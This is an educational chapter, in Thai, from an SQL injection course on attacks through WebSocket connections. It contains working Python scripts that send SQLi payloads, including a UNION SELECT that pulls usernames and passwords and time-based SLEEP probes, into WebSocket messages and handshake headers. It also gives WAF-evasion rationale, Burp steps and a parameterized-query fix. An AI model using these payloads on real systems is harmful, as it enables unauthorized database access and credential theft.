# Part 064: SQL Injection ใน WebSockets

## ภาพรวม

WebSocket connections สามารถเป็นช่องทาง SQL injection ที่มักถูกมองข้าม

**ขั้นตอนที่ 1031-1045**

---

## 1031. WebSocket SQLi คืออะไร

```
WebSocket เป็น persistent connection ระหว่าง client/server
ส่ง data เป็น JSON หรือ text messages
WAF มักไม่ inspect WebSocket traffic

ช่องทาง:
- ws://target/chat -> message.content -> INSERT INTO messages
- ws://target/search -> query.term -> SELECT FROM products
- ws://target/api -> request.id -> SELECT FROM orders

ข้อดีสำหรับ attacker:
1. WAF bypass (WebSocket often exempted)
2. Persistent channel
3. Harder to detect in logs
```

---

## 1032. WebSocket SQLi Testing (Python)

```python
import asyncio
import websockets
import json
import time

async def test_ws_sqli(url: str):
    """Test WebSocket endpoint for SQL injection"""
    
    payloads = [
        # ผ่าน JSON message
        {"action": "search", "query": "' OR '1'='1"},
        {"action": "search", "query": "' UNION SELECT 1,username,password FROM users-- -"},
        {"action": "getUser", "id": "1 OR 1=1"},
        {"action": "getUser", "id": "1' AND SLEEP(3)-- -"},
        # String payloads
        "' OR '1'='1",
        "'; SELECT * FROM users--",
    ]
    
    try:
        async with websockets.connect(url) as ws:
            for payload in payloads:
                start = time.time()
                msg = json.dumps(payload) if isinstance(payload, dict) else payload
                await ws.send(msg)
                
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                    elapsed = time.time() - start
                    
                    resp_lower = response.lower()
                    
                    # ตรวจสอบ errors
                    if any(e in resp_lower for e in ['sql', 'mysql', 'syntax', 'error']):
                        print(f"[+] Error-based SQLi: {str(payload)[:50]}")
                    elif elapsed > 2.5:
                        print(f"[+] Time-based SQLi: {str(payload)[:50]} ({elapsed:.2f}s)")
                    else:
                        print(f"[-] {str(payload)[:40]}: {response[:80]}")
                        
                except asyncio.TimeoutError:
                    elapsed = time.time() - start
                    if elapsed >= 2.9:
                        print(f"[+] Time-based (timeout): {str(payload)[:50]}")
    
    except Exception as e:
        print(f"Connection error: {e}")

# รัน:
# asyncio.run(test_ws_sqli('ws://target.com/ws'))
```

---

## 1033. Burp Suite สำหรับ WebSocket

```
Burp Suite Professional v2023+ รองรับ WebSocket interception:

1. เปิด Burp -> Proxy -> WebSockets history
2. Browse ไปยัง target ที่ใช้ WebSocket
3. Burp จะแสดง WS messages ใน WebSockets history tab
4. Right-click message -> "Send to Repeater"
5. ใน Repeater แก้ไข payload ในช่อง message
6. ส่ง payload และดู response

Tips:
- Filter: WS history -> แสดงเฉพาะ text messages
- ใช้ Intruder กับ WS messages
- Extension: WebSocket Turbo Intruder
```

---

## 1034. WebSocket SQLi ผ่าน Handshake

```python
import requests

# SQLi ใน WebSocket upgrade request
# (HTTP headers ในช่วง handshake)

# ตรวจสอป injection ใน cookies/headers
header_payloads = [
    # ใน Cookie
    {'Cookie': "session=' OR '1'='1"},
    # ใน Origin
    {'Origin': "http://evil.com' UNION SELECT 1--"},
    # ใน custom header
    {'X-User-Id': "1' OR '1'='1"},
]

for headers in header_payloads:
    r = requests.get(
        'http://target/ws-endpoint',
        headers={
            'Upgrade': 'websocket',
            'Connection': 'Upgrade',
            'Sec-WebSocket-Key': 'test==',
            'Sec-WebSocket-Version': '13',
            **headers
        },
        timeout=5
    )
    print(f"Status: {r.status_code}, Headers: {list(headers.keys())[0]}")
```

---

## 1035. Prevention สำหรับ WebSocket

```javascript
// Node.js WebSocket server (secure)
const WebSocket = require('ws');
const mysql = require('mysql2/promise');

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    ws.on('message', async (raw) => {
        let data;
        try {
            data = JSON.parse(raw);
        } catch {
            ws.send(JSON.stringify({ error: 'Invalid JSON' }));
            return;
        }
        
        // SECURE: parameterized query
        if (data.action === 'search') {
            const conn = await mysql.createConnection(process.env.DB_URL);
            const [rows] = await conn.execute(
                'SELECT id, name, price FROM products WHERE name LIKE ?',
                [`%${data.query}%`]  // safe parameterized
            );
            ws.send(JSON.stringify({ results: rows }));
        }
    });
});
```

---

## สรุป

WebSocket SQL Injection:
- **JSON messages** - inject ผ่าน action/query fields
- **Handshake headers** - Cookie, Origin injection
- **WAF bypass** - WebSocket มักไม่ถูก inspect
- **Burp Repeater** - ใช้ intercept WS messages
- **Prevention** - parameterized queries เหมือน HTTP

---

*Part 064 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
